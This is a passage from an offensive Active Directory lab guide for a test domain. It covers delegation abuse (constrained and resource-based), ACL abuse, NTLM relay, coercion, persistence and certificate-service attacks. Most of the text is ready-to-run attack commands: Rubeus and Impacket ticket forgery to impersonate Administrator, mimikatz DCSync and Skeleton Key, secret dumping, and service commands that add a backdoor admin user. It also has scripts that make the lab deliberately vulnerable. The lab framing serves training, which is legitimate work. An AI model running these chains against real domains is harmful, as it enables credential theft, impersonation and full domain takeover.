mimikatz # kerberos::ptt [0;3e7]-0-0-40a50000-DC01$@krbtgt-AKATSUKI.LOCAL.kirbi
```

### Cleanup: Remove Vulnerability

```powershell
Set-ADComputer -Identity "WS01" -TrustedForDelegation $false
```

---

## 5.2 Constrained Delegation

### Concept

Constrained delegation limits impersonation to specific services listed in `msDS-AllowedToDelegateTo`. With the service account credentials, you abuse S4U2Self + S4U2Proxy to impersonate any user to those services.

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Create service account with constrained delegation
$password = ConvertTo-SecureString "WebServicePass!" -AsPlainText -Force
New-ADUser -Name "svc_web" `
    -SamAccountName "svc_web" `
    -UserPrincipalName "svc_web@akatsuki.local" `
    -Path "OU=Shinobi,DC=akatsuki,DC=local" `
    -AccountPassword $password `
    -Enabled $true `
    -PasswordNeverExpires $true

# Set SPN (REQUIRED for S4U attacks to work)
Set-ADUser -Identity "svc_web" -ServicePrincipalNames @{Add='HTTP/websvc.akatsuki.local'}

# Set constrained delegation to CIFS on DC
Set-ADUser -Identity "svc_web" -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.akatsuki.local')}

# Enable Protocol Transition (TrustedToAuthForDelegation)
Set-ADAccountControl -Identity "svc_web" -TrustedToAuthForDelegation $true

# Verify setup
Get-ADUser svc_web -Properties ServicePrincipalNames, msDS-AllowedToDelegateTo, TrustedToAuthForDelegation

Write-Host "svc_web can delegate to CIFS on DC01 with Protocol Transition" -ForegroundColor Yellow
```

### Complete Attack Flow

#### 🌐 REMOTE (From Kali) - Full Chain

**Prerequisites:**
- Domain credentials to enumerate
- Need to obtain svc_web credentials (password or hash)

**Step 1: Enumerate - Find constrained delegation accounts**
```bash
# Using ldapsearch
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
  -b "DC=akatsuki,DC=local" "(msDS-AllowedToDelegateTo=*)" \
  cn msDS-AllowedToDelegateTo userAccountControl

# Using CrackMapExec
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M find-delegation

# Using findDelegation.py (Impacket)
findDelegation.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10

# BloodHound
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All
# Query: MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u
```

**Step 2: Obtain svc_web credentials**

Option A - Kerberoast (if SPN is set):
```bash
# Check if svc_web has an SPN
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10

# If yes, request and crack the hash
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request -outputfile svc_web.hash

# Crack with hashcat
hashcat -m 13100 svc_web.hash /usr/share/wordlists/rockyou.txt
```

Option B - Dump from machine running the service:
```bash
# If you have admin on machine where svc_web service runs
secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.11

# Or via LSASS dump
```

Option C - Password in description/notes field:
```bash
# Check user attributes for passwords
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
  -b "DC=akatsuki,DC=local" "(sAMAccountName=svc_web)" description info
```

**Step 3: Perform S4U attack with svc_web credentials**
```bash
# S4U2Self + S4U2Proxy to get ticket as Administrator for CIFS on DC
getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10

# If you have the hash instead
getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
  -hashes :58a478135a93ac3bf058a5ea0e8fdb71 AKATSUKI/svc_web -dc-ip 10.10.12.10

# This creates administrator.ccache
```

**Step 4: Use the impersonated ticket**
```bash
# Export the ticket
export KRB5CCNAME=$(pwd)/administrator.ccache

# Verify
klist

# Access DC CIFS share
smbclient.py -k -no-pass dc01.akatsuki.local

# List shares
smbclient.py -k -no-pass dc01.akatsuki.local -c 'shares'

# Get shell via SMB
psexec.py -k -no-pass dc01.akatsuki.local

# Or wmiexec
wmiexec.py -k -no-pass dc01.akatsuki.local

# DCSync (if you got LDAP access via alternative service)
secretsdump.py -k -no-pass akatsuki.local/administrator@dc01.akatsuki.local
```

**Step 5: Alternative Service Abuse (SPN doesn't matter!)**
```bash
# The service in the ticket (cifs) can be changed!
# Even though delegation is to CIFS, you can request other services

# Get LDAP ticket instead (for DCSync)
getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
  -altservice ldap/dc01.akatsuki.local \
  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10

# Get HTTP ticket (for WinRM/PSRemoting)
getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
  -altservice http/dc01.akatsuki.local \
  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10

# Get HOST ticket
getST.py -spn cifs/dc01.akatsuki.local -impersonate administrator \
  -altservice host/dc01.akatsuki.local \
  AKATSUKI/svc_web:'WebServicePass!' -dc-ip 10.10.12.10
```

#### 💻 LOCAL (From Windows) - Full Chain

**Step 1: Find constrained delegation accounts**
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object cn, msds-allowedtodelegateto

# AD Module
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo |
  Select-Object SamAccountName, msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo |
  Select-Object Name, msDS-AllowedToDelegateTo
```

**Step 2: Get svc_web hash (need to obtain this first)**
```powershell
# If running as svc_web or have access to machine running the service
# Extract from LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Or calculate hash from known password
.\Rubeus.exe hash /password:WebServicePass! /user:svc_web /domain:akatsuki.local
# Output: rc4_hmac: 58A478135A93AC3BF058A5EA0E8FDB71
```

**Step 3: Perform S4U attack with Rubeus**
```powershell
# Full S4U chain - request ticket as Administrator for CIFS on DC
.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt

# With AES key (if you have it)
.\Rubeus.exe s4u /user:svc_web /aes256:AESKEY \
  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /ptt

# Rubeus will:
# 1. Request TGT for svc_web
# 2. S4U2Self: Get forwardable ticket as Administrator to svc_web
# 3. S4U2Proxy: Exchange for ticket as Administrator to cifs/dc01
# 4. /ptt: Inject ticket into memory
```

**Step 4: Verify and use the ticket**
```powershell
# Verify ticket loaded
klist

# Access DC shares
dir \\dc01.akatsuki.local\c$
dir \\dc01.akatsuki.local\admin$

# Copy files
copy \\dc01.akatsuki.local\c$\Windows\System32\config\SAM C:\temp\

# Create a service for shell
sc \\dc01.akatsuki.local create pwned binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc \\dc01.akatsuki.local start pwned
```

**Step 5: Alternative Service Abuse (Windows)**
```powershell
# Change service type in the ticket - get LDAP for DCSync
.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:ldap /ptt

# Then DCSync
mimikatz # lsadump::dcsync /domain:akatsuki.local /user:krbtgt

# Get HTTP for WinRM
.\Rubeus.exe s4u /user:svc_web /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:cifs/dc01.akatsuki.local /altservice:http /ptt

# Then PSRemoting
Enter-PSSession -ComputerName dc01.akatsuki.local
```

### Cleanup: Remove Vulnerability

```powershell
Remove-ADUser -Identity "svc_web" -Confirm:$false
```

---

## 5.3 Resource-Based Constrained Delegation (RBCD)

### Concept

RBCD flips the trust model - the target resource specifies who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write to a computer object, you can make it trust your controlled machine account.

### Lab Setup: Make It Vulnerable

```powershell
# Run on DC as Domain Admin

# Grant orochimaru GenericWrite on WS02's computer object
$ws02 = Get-ADComputer WS02
$acl = Get-Acl "AD:\$($ws02.DistinguishedName)"

$identity = New-Object System.Security.Principal.NTAccount("AKATSUKI\orochimaru")
$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericWrite"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)

Set-Acl "AD:\$($ws02.DistinguishedName)" $acl

Write-Host "orochimaru can now write to WS02 computer object - RBCD vulnerable" -ForegroundColor Yellow

# Verify
Get-Acl "AD:\$($ws02.DistinguishedName)" | Select-Object -ExpandProperty Access |
  Where-Object { $_.IdentityReference -match "orochimaru" }
```

### Complete Attack Flow

#### 🌐 REMOTE (From Kali) - Full Chain

**Prerequisites:**
- Domain credentials
- Write access to a computer object (GenericWrite/GenericAll/WriteDACL)
- MachineAccountQuota > 0 (default is 10)

**Step 1: Enumerate - Check if you have write access to any computer**
```bash
# Using bloodhound-python
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All

# BloodHound query: Find computers where you have write access
# MATCH p=(u:User {name:"OROCHIMARU@AKATSUKI.LOCAL"})-[r:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p

# Using ldapsearch to check ACLs (complex, BloodHound is easier)
```

**Step 2: Check MachineAccountQuota**
```bash
# Using CrackMapExec
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M maq

# Using ldapsearch
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
  -b "DC=akatsuki,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota

# Output: ms-DS-MachineAccountQuota: 10 (default - you can create 10 machine accounts)
```

**Step 3: Create a machine account you control**
```bash
# Using Impacket addcomputer.py
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password123!' \
  -dc-ip 10.10.12.10 AKATSUKI/orochimaru:'Snake2024!'

# Verify it was created
crackmapexec ldap 10.10.12.10 -u orochimaru -p 'Snake2024!' -M get-desc-users

# Or verify with ldapsearch
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' \
  -b "DC=akatsuki,DC=local" "(sAMAccountName=YOURPC$)" dn
```

**Step 4: Configure RBCD - Set WS02 to trust YOURPC for delegation**
```bash
# Using rbcd.py (Impacket)
rbcd.py -delegate-to 'WS02$' -delegate-from 'YOURPC$' -dc-ip 10.10.12.10 \
  -action write AKATSUKI/orochimaru:'Snake2024!'

# Verify the delegation was set
rbcd.py -delegate-to 'WS02$' -dc-ip 10.10.12.10 \
  -action read AKATSUKI/orochimaru:'Snake2024!'

# Should show: Delegation rights for WS02$: YOURPC$
```

**Step 5: Perform S4U attack to get Administrator ticket for WS02**
```bash
# S4U2Self + S4U2Proxy to impersonate Administrator to CIFS on WS02
getST.py -spn cifs/ws02.akatsuki.local -impersonate administrator \
  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10

# This creates administrator.ccache
# If you get errors about the SPN, try with the hostname only:
getST.py -spn cifs/WS02 -impersonate administrator \
  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
```

**Step 6: Use the ticket to access WS02**
```bash
# Export the ticket
export KRB5CCNAME=$(pwd)/administrator.ccache

# Verify it's loaded
klist

# Access WS02 via SMB
smbclient.py -k -no-pass ws02.akatsuki.local

# Get shell on WS02
psexec.py -k -no-pass ws02.akatsuki.local
wmiexec.py -k -no-pass ws02.akatsuki.local

# Or run commands
smbexec.py -k -no-pass ws02.akatsuki.local

# Dump SAM/LSA from WS02
secretsdump.py -k -no-pass ws02.akatsuki.local
```

**Step 7: Post-exploitation - Pivot further**
```bash
# Now you're admin on WS02, dump any cached credentials
secretsdump.py -k -no-pass ws02.akatsuki.local

# If a Domain Admin was logged in, you get their hash!
# Use that to move to DC
psexec.py -hashes :DAHASH AKATSUKI/itachi@10.10.12.10
```

#### 💻 LOCAL (From Windows) - Full Chain

**Step 1: Enumerate - Find computers you can write to**
```powershell
# PowerView - Find objects where current user has GenericWrite/GenericAll
Import-Module .\PowerView.ps1

# Check your access rights
Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object { $_.IdentityReferenceName -match "orochimaru" -and $_.ObjectType -eq "Computer" }

# Or check specific computer
Get-DomainObjectAcl -Identity "WS02" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl" }
```

**Step 2: Check MachineAccountQuota**
```powershell
# AD Module
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | ForEach-Object {
    Get-ADObject -Identity $_ -Properties ms-DS-MachineAccountQuota |
    Select-Object -ExpandProperty ms-DS-MachineAccountQuota
}

# Or LDAP query
([ADSI]"LDAP://DC=akatsuki,DC=local")."ms-DS-MachineAccountQuota"
```

**Step 3: Create a machine account using PowerMad**
```powershell
# Import PowerMad
Import-Module .\Powermad.ps1

# Create new machine account
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Verify
Get-ADComputer YOURPC

# Get the SID (needed for raw RBCD config)
$sid = (Get-ADComputer YOURPC).SID.Value
Write-Host "Machine account SID: $sid"
```

**Step 4: Configure RBCD on WS02**
```powershell
# Method 1: Using Set-ADComputer (easiest)
Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount YOURPC$

# Verify
Get-ADComputer WS02 -Properties PrincipalsAllowedToDelegateToAccount |
  Select-Object -ExpandProperty PrincipalsAllowedToDelegateToAccount

# Method 2: Using PowerView (if Set-ADComputer fails)
$sid = (Get-ADComputer YOURPC).SID.Value
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject WS02 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Step 5: Get the NTLM hash of your machine account**
```powershell
# Rubeus can calculate hash from password
.\Rubeus.exe hash /password:Password123! /user:YOURPC$ /domain:akatsuki.local

# Output example:
# [*] rc4_hmac: 58A478135A93AC3BF058A5EA0E8FDB71
# [*] aes128_cts_hmac_sha1: ...
# [*] aes256_cts_hmac_sha1: ...

# Save the rc4_hmac (NTLM hash)
```

**Step 6: Perform S4U attack with Rubeus**
```powershell
# Full S4U chain - impersonate Administrator to CIFS on WS02
.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt

# Or with AES key for opsec
.\Rubeus.exe s4u /user:YOURPC$ /aes256:AESKEY \
  /impersonateuser:administrator /msdsspn:cifs/ws02.akatsuki.local /ptt

# Rubeus output will show:
# [*] Action: S4U
# [*] Building S4U2self request for: 'YOURPC$@AKATSUKI.LOCAL'
# [*] Sending S4U2self request
# [+] S4U2self success!
# [*] Building S4U2proxy request for: 'administrator@AKATSUKI.LOCAL'
# [+] S4U2proxy success!
# [+] Ticket successfully imported!
```

**Step 7: Verify and use the ticket**
```powershell
# Verify ticket is loaded
klist

# Access WS02 file system
dir \\ws02.akatsuki.local\c$
dir \\ws02.akatsuki.local\admin$

# Copy files
copy \\ws02.akatsuki.local\c$\Users\Administrator\Desktop\* C:\loot\

# Create a remote service for shell
sc \\ws02.akatsuki.local create pwned binpath= "cmd.exe /c net user hacker Password123! /add"
sc \\ws02.akatsuki.local start pwned

# Or use PSExec
.\PsExec.exe \\ws02.akatsuki.local cmd.exe
```

**Step 8: Alternative - Get other service tickets**
```powershell
# Get LDAP service ticket (useful for LDAP operations)
.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:ldap/ws02.akatsuki.local /ptt

# Get HOST service ticket (useful for WMI, services)
.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:host/ws02.akatsuki.local /ptt

# Get HTTP service ticket (useful for WinRM)
.\Rubeus.exe s4u /user:YOURPC$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:administrator /msdsspn:http/ws02.akatsuki.local /ptt

Enter-PSSession -ComputerName ws02.akatsuki.local
```

### RBCD via NTLM Relay (Bonus Attack Path)

If you can coerce authentication but don't have write access yet:

```bash
# Step 1: Start ntlmrelayx with RBCD escalation
# This will relay captured auth to LDAP and set RBCD automatically
ntlmrelayx.py -t ldaps://10.10.12.10 --delegate-access --escalate-user 'YOURPC$'

# Step 2: Coerce a machine to authenticate to you
python3 PetitPotam.py YOUR_IP 10.10.12.11

# Step 3: ntlmrelayx will relay and configure RBCD
# Output: Delegating access for YOURPC$ on WS01$

# Step 4: Continue with S4U attack as above
getST.py -spn cifs/ws01.akatsuki.local -impersonate administrator \
  AKATSUKI/'YOURPC$':'Password123!' -dc-ip 10.10.12.10
```

### Cleanup: Remove Vulnerability

```powershell
# Remove RBCD configuration from WS02
Set-ADComputer WS02 -PrincipalsAllowedToDelegateToAccount $null

# Verify removal
Get-ADComputer WS02 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Remove the fake machine account
Remove-ADComputer YOURPC -Confirm:$false

# Remove orochimaru's write access
$ws02 = Get-ADComputer WS02
$acl = Get-Acl "AD:\$($ws02.DistinguishedName)"
$acl.Access | Where-Object { $_.IdentityReference -match "orochimaru" } | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "AD:\$($ws02.DistinguishedName)" $acl
```

---

# 6. ACL/Permission Abuse

## Dangerous ACL Rights

| Right | Object | Abuse |
|-------|--------|-------|
| **GenericAll** | User | Reset password, set SPN (Kerberoast) |
| **GenericAll** | Group | Add yourself as member |
| **GenericAll** | Computer | Configure RBCD |
| **GenericWrite** | User | Set SPN, modify logon script |
| **WriteOwner** | Any | Take ownership, then modify DACL |
| **WriteDACL** | Any | Grant yourself any rights |
| **ForceChangePassword** | User | Reset password without knowing old |
| **AddMember** | Group | Add yourself to group |

## Lab Setup: Make It Vulnerable

```powershell
# Grant orochimaru GenericAll on deidara
$user = Get-ADUser deidara
$acl = Get-Acl "AD:\$($user.DistinguishedName)"

$identity = New-Object System.Security.Principal.NTAccount("AKATSUKI\orochimaru")
$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)

Set-Acl "AD:\$($user.DistinguishedName)" $acl

Write-Host "orochimaru now has GenericAll on deidara - can reset password or set SPN" -ForegroundColor Yellow
```

## Finding Abusable ACLs

#### 🌐 REMOTE (From Kali)

```bash
# Using bloodhound-python to collect ACL data
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c ACL

# Using ldapsearch for specific ACL queries
ldapsearch -x -H ldap://10.10.12.10 -D "orochimaru@akatsuki.local" -w 'Snake2024!' -b "DC=akatsuki,DC=local" "(objectClass=user)" nTSecurityDescriptor

# Using dacledit.py (Impacket) - view ACLs
dacledit.py -action read -target 'deidara' -principal 'orochimaru' AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Check specific user ACLs
Get-DomainObjectAcl -Identity deidara -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# BloodHound - Best visualization
.\SharpHound.exe -c All
# Import to BloodHound, look at attack paths
```

## Exploitation Examples

#### 🌐 REMOTE (From Kali)

```bash
# GenericAll on User - Reset password remotely
# Using Impacket's net.py or rpcclient
net rpc password deidara 'NewPass123!' -U 'akatsuki.local/orochimaru%Snake2024!' -S 10.10.12.10

# GenericAll on User - Set SPN for Kerberoasting (using dacledit)
# First add SPN, then Kerberoast
addspn.py -u 'akatsuki.local\orochimaru' -p 'Snake2024!' -t 'deidara' -s 'fake/spn' -dc-ip 10.10.12.10

# Then Kerberoast
GetUserSPNs.py AKATSUKI/orochimaru:'Snake2024!' -dc-ip 10.10.12.10 -request

# AddMember - Add user to group (using net.py)
net rpc group addmem "Domain Admins" orochimaru -U 'akatsuki.local/orochimaru%Snake2024!' -S 10.10.12.10

# Using bloodyAD (great for ACL abuse)
bloodyAD -u orochimaru -p 'Snake2024!' -d akatsuki.local --host 10.10.12.10 set password deidara 'NewPass123!'
bloodyAD -u orochimaru -p 'Snake2024!' -d akatsuki.local --host 10.10.12.10 add groupMember "Domain Admins" orochimaru
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

```powershell
# GenericAll on User - Reset password
Set-DomainUserPassword -Identity deidara -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Alternative using AD module
Set-ADAccountPassword -Identity deidara -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# GenericAll on User - Set SPN for Kerberoasting
Set-DomainObject -Identity deidara -Set @{serviceprincipalname='fake/spn'}

# WriteDACL - Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity orochimaru -Rights All

# WriteOwner - Take ownership then modify
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity orochimaru
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity orochimaru -Rights All

# AddMember on Group
Add-DomainGroupMember -Identity "Domain Admins" -Members orochimaru

# Using AD module
Add-ADGroupMember -Identity "Domain Admins" -Members orochimaru
```

---

# 7. NTLM Relay Attacks

## Concept

Relay NTLM authentication from a victim to another server to gain access.

```
Victim → Attacker (captures auth) → Relays to Target → Authenticated as Victim
```

## Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| NTLM design | Auth can be relayed in real-time |
| SMB Signing disabled | Allows relaying SMB auth |
| Same credentials | Victim has access to target |

## Lab Setup: Make It Vulnerable

```powershell
# Disable SMB Signing on WS01 (makes it relay target)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0

Write-Host "SMB Signing disabled on this machine - vulnerable to relay" -ForegroundColor Yellow
# Requires reboot
```

## Attack Methods

#### 🌐 REMOTE (From Kali - This is primarily a remote attack)

**Step 1: Find relay targets (machines without signing)**
```bash
# CrackMapExec - check SMB signing
crackmapexec smb 10.10.12.0/24 --gen-relay-list targets.txt

# NetExec version
netexec smb 10.10.12.0/24 --gen-relay-list targets.txt

# Nmap script
nmap --script smb2-security-mode -p 445 10.10.12.0/24
```

**Step 2: Start Responder to capture auth (poison LLMNR/NBNS/mDNS)**
```bash
# Edit /etc/responder/Responder.conf - set SMB = Off, HTTP = Off
sudo responder -I eth0 -r -d -w

# Or use Responder in analyze mode
sudo responder -I eth0 -A
```

**Step 3: Start ntlmrelayx**
```bash
# Basic relay to SMB
ntlmrelayx.py -tf targets.txt -smb2support

# Relay with SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Relay to LDAP for shadow credentials or RBCD
ntlmrelayx.py -t ldap://10.10.12.10 --shadow-credentials
ntlmrelayx.py -t ldap://10.10.12.10 --delegate-access --escalate-user YOURPC$

# Relay and execute command
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\temp\pwned.txt"

# Relay and dump SAM
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

**Step 4: Trigger authentication (if needed)**
```bash
# PrinterBug
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@10.10.12.10 KALI_IP

# PetitPotam (unauthenticated on unpatched DCs!)
python3 PetitPotam.py KALI_IP 10.10.12.10

# Coercer - tries all methods
python3 coercer.py -u orochimaru -p 'Snake2024!' -d akatsuki.local -l KALI_IP -t 10.10.12.10
```

**Step 5: Use relayed sessions**
```bash
# With SOCKS proxy enabled
proxychains secretsdump.py -no-pass AKATSUKI/relayed_user@10.10.12.21
proxychains smbclient.py -no-pass AKATSUKI/relayed_user@10.10.12.21
```

#### 💻 LOCAL (From Compromised Host - Forward auth)

```powershell
# Use Inveigh (PowerShell Responder)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Or use InveighZero (C# version)
.\InveighZero.exe

# Forward captured hashes to attacker's ntlmrelayx
# From compromised host, you can also use portbender/socat to redirect traffic
```

## Blue Team: Prevention

- Enable SMB Signing (required on DCs by default)
- Enable EPA (Extended Protection for Authentication)
- Disable NTLM where possible

---

# 8. Coercion Attacks

## Concept

Force a target machine to authenticate to an attacker-controlled server.

## Methods

| Attack | Protocol | Description |
|--------|----------|-------------|
| **PetitPotam** | MS-EFSRPC | Abuses EFS API |
| **PrinterBug** | MS-RPRN | Abuses Print Spooler |
| **DFSCoerce** | MS-DFSNM | Abuses DFS |
| **ShadowCoerce** | MS-FSRVP | Abuses VSS |

## Lab Setup: Print Spooler Running

```powershell
# Verify Print Spooler is running (default on)
Get-Service Spooler

# If not running:
Start-Service Spooler
```

## Attack Methods

```bash
# PetitPotam (no auth needed on older systems)
python3 PetitPotam.py LISTENER_IP DC01

# PrinterBug (requires auth)
python3 printerbug.py AKATSUKI/orochimaru:'Snake2024!'@DC01 LISTENER_IP

# Coercer (tries everything)
coercer -u orochimaru -p 'Snake2024!' -d akatsuki.local -t DC01 -l LISTENER_IP
```

---

# 9. Persistence Techniques

## AdminSDHolder

Protected groups have ACLs overwritten by AdminSDHolder every 60 minutes. Add yourself = persistence.

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=akatsuki,DC=local" -PrincipalIdentity orochimaru -Rights All
# Wait 60 minutes - now have GenericAll on all protected groups
```

## SID History

Add Domain Admin SID to your SID history.

```powershell
mimikatz # sid::add /sam:orochimaru /new:S-1-5-21-XXXXX-512
```

## Skeleton Key

Patch LSASS on DC to accept master password.

```powershell
mimikatz # misc::skeleton
# Now "mimikatz" works as password for any account
```

## DCShadow

Register a rogue DC to push malicious changes.

```powershell
# Terminal 1 - Push changes
mimikatz # lsadump::dcshadow /object:targetuser /attribute:description /value:"pwned"

# Terminal 2 - Execute
mimikatz # lsadump::dcshadow /push
```

---

# 10. ADCS Attacks

## Concept

Misconfigured certificate templates can lead to domain takeover.

## Common Vulnerabilities

| ESC | Name | Issue |
|-----|------|-------|
| ESC1 | Enrollee Supplies Subject | User can specify arbitrary SAN |
| ESC2 | Any Purpose EKU | Certificate can be used for any purpose |
| ESC3 | Enrollment Agent | Can request certs on behalf of others |
| ESC4 | Template ACL | Users can modify template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows arbitrary SANs |
| ESC7 | CA ACL | Users have dangerous CA permissions |
| ESC8 | NTLM Relay to ADCS | Relay to HTTP enrollment endpoint |

## Lab Setup: Install ADCS

```powershell
# On DC - Install Certificate Services
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

# Configure as Enterprise CA
Install-AdcsCertificationAuthority -CAType EnterpriseRootCa -Force
```

## Lab Setup: Make ESC1 Vulnerable

```powershell
# After ADCS is installed, create vulnerable template
# (This is a complex setup - use certipy to find vulnerable templates)
```

## Attack Methods

```bash
# Find vulnerable templates
certipy find -u orochimaru@akatsuki.local -p 'Snake2024!' -dc-ip 10.10.12.10

# ESC1 - Request cert as Administrator
certipy req -u orochimaru@akatsuki.local -p 'Snake2024!' -ca AKATSUKI-DC01-CA -template VulnTemplate -upn administrator@akatsuki.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.12.10
```

## Blue Team: Prevention

- Audit certificate templates
- Remove "Enrollee Supplies Subject"
- Require manager approval
- Use strong template ACLs

---

# Tool Reference

| Tool | Purpose | Platform |
|------|---------|----------|
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction | Windows |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos attacks | Windows |
| [Impacket](https://github.com/fortra/impacket) | Network protocols | Python |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Attack path mapping | Cross-platform |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration | PowerShell |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | Swiss army knife | Python |
| [Certipy](https://github.com/ly4k/Certipy) | ADCS attacks | Python |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell | Ruby |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBNS poison | Python |
| [Coercer](https://github.com/p0dalirius/Coercer) | Coercion attacks | Python |
| [Kerbrute](https://github.com/ropnop/kerbrute) | Kerberos brute/spray | Go |

---

# Quick Reference: Lab Vulnerability Setup

| Attack | Setup Command |
|--------|--------------|
| Password Spray | Pre-configured (pain & kisame share password) |
| Kerberoasting | `Set-ADUser svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/dc01:1433"}` |
